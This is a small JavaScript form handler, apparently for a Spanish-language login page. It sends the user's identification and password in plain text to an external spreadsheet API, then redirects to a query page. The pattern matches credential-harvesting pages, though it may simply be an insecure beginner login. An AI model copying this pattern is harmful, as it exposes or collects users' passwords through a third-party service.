const form = document.getElementById("form");

form.addEventListener("submit", (e) => {
  e.preventDefault();

  const identificacion = form.identificacion.value;
  const contraseña = form.contraseña.value;

  const dates = {
    identificacion: identificacion,
    pass: contraseña,
  };

  fetch("https://sheet.best/api/sheets/e8d8549b-2450-4a66-80d9-9d1368395701",
    {
      method: "POST",
      mode: "cors",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(dates),
    }
  )
    .then((response) => {
      if (response.ok) {
        window.location.href = "hacer_consulta.html";
      } else {
        console.error("Datos incorrectos");
      }
    })
    .catch((error) => {
      console.log("Error", error);
      alert("Hubo un problema istrarse.");
    });
});